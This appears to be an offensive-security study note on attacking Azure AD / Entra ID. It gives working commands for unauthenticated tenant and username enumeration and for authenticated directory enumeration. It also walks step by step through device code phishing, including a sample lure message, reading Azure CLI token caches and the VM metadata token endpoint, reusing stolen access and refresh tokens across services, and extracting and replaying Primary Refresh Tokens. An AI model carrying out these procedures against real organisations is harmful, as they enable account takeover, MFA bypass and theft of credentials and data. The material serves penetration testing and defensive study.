# 02.2 — Azure AD Enumeration and Token Attacks

## What This Note Covers

How to enumerate Azure AD / Entra ID without credentials, how to enumerate with credentials, and the primary token-based attack techniques: OAuth device code phishing, access token theft, refresh token abuse, and Primary Refresh Token (PRT) attacks.

---

## Phase 1: Unauthenticated Azure AD Enumeration

Azure AD exposes some information without authentication. This is by design — federated login requires knowing the tenant configuration.

### Tenant Discovery

```bash
# Discover if a domain uses Azure AD (and get tenant ID)
curl "https://login.microsoftonline.com/TARGET-DOMAIN.com/.well-known/openid-configuration" \
  | python3 -m json.tool

# Response contains:
# "issuer": "https://login.microsoftonline.com/TENANT_ID/v2.0"
# "token_endpoint": includes the tenant ID

# Alternative — login endpoint redirect reveals tenant
curl -I "https://login.microsoftonline.com/TARGET-DOMAIN.com/oauth2/v2.0/authorize"

# Get tenant ID from domain
curl "https://login.microsoftonline.com/TARGET-DOMAIN.com/v2.0/.well-known/openid-configuration" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['issuer'].split('/')[3])"
```

### User Enumeration (No Credentials)

Azure AD validates whether a user account exists before checking the password. This difference in responses allows username enumeration.

```bash
# Tool: o365creeper — validates email addresses against Azure AD
git clone https://github.com/LMGsec/o365creeper
python3 o365creeper.py -f emails.txt -o valid_users.txt

# Tool: TeamFiltration — O365/Azure AD user enumeration + spraying
git clone https://github.com/Flangvik/TeamFiltration

# Manual approach — POST to /GetCredentialType endpoint
# Returns different responses for valid vs invalid users
curl -s -X POST \
  "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username": "target@company.com"}' \
  | python3 -m json.tool
# "IfExistsResult": 0 → user does NOT exist
# "IfExistsResult": 1 → user EXISTS
# "IfExistsResult": 5 → user exists and is federated (uses external IdP)
# "IfExistsResult": 6 → user exists (different domain config)
```

> [!warning] Federated tenants behave differently
> If the tenant uses federated authentication (ADFS, Okta, Ping), the enumeration response is always the same regardless of whether the user exists — no enumeration possible via this method.

### Tenant Information Gathering

```bash
# Enumerate tenant details
curl "https://login.microsoftonline.com/TENANT_ID/.well-known/openid-configuration"

# Get list of domains associated with the tenant
curl "https://login.microsoftonline.com/TENANT_ID/v2.0/.well-known/openid-configuration"

# AADInternals: get tenant info
# Install-Module AADInternals (PowerShell)
Get-AADIntLoginInformation -Domain "target.com"
# Returns: tenant ID, federation info, whether cloud-only or federated

# Check if tenant allows external access
Invoke-AADIntReconAsOutsider -DomainName "target.com"
```

## Phase 2: Authenticated Azure AD Enumeration

Once you have credentials or a token, you can enumerate the tenant using Microsoft Graph API or Azure CLI.

### Using Azure CLI

```bash
# Current identity
az ad signed-in-user show

# All users
az ad user list --output table

# Specific user details
az ad user show --id user@company.com

# Users with specific attributes
az ad user list --filter "jobTitle eq 'Global Administrator'" --output table

# All groups
az ad group list --output table

# Members of a specific group
az ad group member list --group "Global Admins" --output table

# All service principals
az ad sp list --all --output table

# All app registrations  
az ad app list --all --output table

# Directory role members (who has Global Admin, etc.)
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/ROLE_ID/members"
```

### Using ROADtools (Best for Comprehensive Enum)

```bash
# Authenticate — multiple methods
roadrecon auth --device-code          # device code flow (interactive)
roadrecon auth -u user@company.com -p password  # username/password
roadrecon auth --access-token TOKEN   # existing token

# Gather ALL Azure AD data into local database
roadrecon gather

# Launch the GUI explorer
roadrecon gui
# Browse: http://localhost:5000

# ROADtools collects:
# - All users, groups, roles
# - All service principals and app registrations
# - OAuth consent grants (what permissions apps have)
# - Device registrations
# - Conditional Access policies
# - Role assignments
```

## Token-Based Attacks

Azure authentication is built on OAuth 2.0 and OpenID Connect. Understanding tokens is essential for Azure AD attacks.

### Azure Token Types

| Token | Lifetime | Purpose |
|---|---|---|
| **Access Token** | 1 hour (default) | Presented to APIs to prove identity |
| **Refresh Token** | 90 days (inactive) / rolling | Used to get new access tokens without re-auth |
| **ID Token** | Short | Identity information (not for API access) |
| **Primary Refresh Token (PRT)** | 14 days | Device-level token, highest value |

---

## Attack 1: OAuth Device Code Phishing

Device code phishing abuses the OAuth device code flow — a legitimate flow designed for devices without browsers (smart TVs, IoT). The attacker initiates the flow and sends the device code to the victim, who authenticates on Microsoft's legitimate site, granting the attacker an access token and refresh token.

**Why it's effective:** The victim authenticates on `login.microsoftonline.com` — completely legitimate. No malicious URL, no fake page. Bypasses MFA if the victim has already completed MFA.

```bash
# Step 1: Request a device code (attacker)
curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=openid profile offline_access https://graph.microsoft.com/.default" \
  | python3 -m json.tool

# Returns:
# "device_code": "LONG_CODE"
# "user_code": "ABCD-EFGH"  ← send this to victim
# "verification_uri": "https://microsoft.com/devicelogin"

# Step 2: Attacker sends phishing email:
# "Please authenticate at https://microsoft.com/devicelogin and enter code: ABCD-EFGH"

# Step 3: Poll for token (attacker)
curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=LONG_CODE"

# Once victim authenticates:
# Returns access_token, refresh_token, id_token
```

## Attack 2: Access Token Theft and Reuse

Access tokens are bearer tokens — anyone holding one can use it.

### Where Tokens Are Found

```bash
# 1. In memory of browser processes (Chrome, Edge)
# Tools: SharpDPAPI, mimikatz (TokenCache)

# 2. In Azure CLI token cache (on compromised workstation)
cat ~/.azure/msal_token_cache.json
# Contains tokens for all az cli sessions on this machine

# 3. In application logs or HTTP proxy logs
# Access tokens appear as Bearer tokens in Authorization headers

# 4. In environment variables of CI/CD systems
# AZURE_ACCESS_TOKEN, ARM_ACCESS_TOKEN etc.

# 5. From metadata service (on Azure VMs)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Using a Stolen Access Token

```bash
# Use token with Azure REST API
TOKEN="eyJ0eXAiOiJKV1Qi..."

# Who does this token belong to?
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me"

# List subscriptions accessible with this token
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List all Azure AD users
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users"

# Import into az CLI
az account get-access-token  # shows current token format
# To use a stolen token, you typically use REST API directly
```

## Attack 3: Refresh Token Abuse

Refresh tokens are valid for 90 days (or 1 year for persistent sessions). If you get a refresh token, you can generate new access tokens for any Azure resource indefinitely.

```bash
# Exchange refresh token for a new access token
# (targeting a different resource — this is token "pivoting")
curl -s -X POST \
  "https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c\
&grant_type=refresh_token\
&refresh_token=REFRESH_TOKEN\
&scope=https://graph.microsoft.com/.default"

# Then use the new access token for Graph API

# Target different resources using the same refresh token:
# &scope=https://management.azure.com/.default  (ARM — Azure resources)
# &scope=https://graph.microsoft.com/.default    (Graph — Azure AD)
# &scope=https://vault.azure.net/.default        (Key Vault)
# &scope=https://storage.azure.com/.default      (Azure Storage)
```

> [!danger] One refresh token → access to all Azure services
> A single refresh token lets you request access tokens for any Azure service the identity has permissions to. This is why refresh tokens are so valuable — they're persistent and broad.

## Attack 4: Primary Refresh Token (PRT) Attacks

The PRT is the most powerful token in Azure. It's issued to Azure AD joined or registered devices and is stored in the Local Security Authority (LSASS) on Windows. It can be used to generate access tokens for any resource without MFA challenges.

### What Makes PRTs Special
- Valid for 14 days, auto-renewed on device activity
- Includes a **session key** signed by the device's TPM (or not, if TPM not used)
- Bypasses MFA — the MFA claim is embedded in the PRT
- Can be used to generate tokens for any resource

### PRT Extraction (requires code execution on the device)

```powershell
# Tool: ROADtoken (extract PRT from Windows)
# https://github.com/dirkjanm/ROADtoken

# Tool: AADInternals
# Get PRT from Chrome cookie (if device is AAD-joined)
Import-Module AADInternals
Get-AADIntAccessTokenFromCache -Resource "https://graph.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Extract PRT using pass-the-PRT technique
$prtCookie = Get-AADIntUserPRTToken
Get-AADIntAccessTokenForAADGraph -PRTToken $prtCookie
```

### Using a Stolen PRT

```powershell
# AADInternals: use PRT to get access token (bypasses MFA)
$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prtCookie

# Enumerate Azure AD as the victim (with their MFA context)
Get-AADIntUsers -AccessToken $token
```

> [!warning] PRT attacks require local access
> PRTs are protected on devices with TPM — the session key is bound to the hardware and cannot be extracted. On devices without TPM, the PRT can be stolen with local admin rights. Always check: is TPM enforced?
